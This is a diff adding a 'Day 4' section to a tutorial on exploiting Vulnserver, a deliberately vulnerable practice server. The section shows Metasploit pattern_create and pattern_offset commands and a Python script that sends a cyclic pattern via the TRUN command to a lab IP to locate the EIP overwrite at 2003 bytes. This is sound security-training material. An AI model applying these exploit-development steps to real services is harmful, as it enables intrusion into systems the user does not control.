@@ -136,3 +136,52 @@ This means that we have a buffer overflow vulnerability on our hands and we have
 Between the issue i face on Vulnserver is that at times Vulnserver will not crash, but Immunity will pause, which indicates a crash.  In this instance, you may 1) have to hit “Ctrl + C” to stop the fuzzing script and 2) not have all registers overwritten by “A”‘s.  This is okay as long as your program crashed and you have a general idea as to how many bytes were sent.
 
 ####  `Day 4`
+
+`FINDING THE OFFSET`
+
+Since we can overwrite the EIP and we know the overwrite occurred between 1 and 2400 bytes (let’s use 3,000 moving forward for a little extra padding), we can use a couple of Ruby tools called Pattern Create and Pattern Offset to find the exact location of the overwrite.
+
+![Image](https://imgur.com/9Q75ffV.png)
+
+Now let locate it on our kali machine.
+
+![Image](https://imgur.com/WeBWczb.png)
+
+`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb`
+
+Pattern Create allows us to generate a cyclical amount of bytes, based on the number of bytes we specify. We can then send those bytes to Vulnserver, instead of A’s, and try to find exactly where we overwrote the EIP. Pattern Offset will help us determine that soon.
+
+![Image](https://imgur.com/a6H1TkB.png)
+
+Now let modify our code like that below;
+
+```
+#!/usr/bin/python 
+import sys, socket
+ 
+offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1>
+
+
+try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('172.16.139.133',9999))
+        s.send(('TRUN /.:/' + offset))
+        s.close()
+
+except:
+        print "Error Connecting To Server" 
+        sys.exit()
+```
+![Image](https://imgur.com/MYAd2av.png)
+
+Cool we overwrite the program again everything appears as it did before, with Vulnserver crashing and our `TRUN` message appearing on the EAX register. Now, look at the EIP. The value is 386F4337 cool.
+
+If we executed correctly, this value is actually part of our code that we generated with Pattern Create. Let’s try using Pattern Offset to find out.
+
+Now let use the create_offset.rb `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb`
+
+![Image](https://imgur.com/BWBMqld.png)
+
+Cool we got exact match was found at 2003 bytes. This is really awesome lol i feel so cool We can now try to control the EIP, which will be critical later in our exploit.
+
+####  `Day 5`
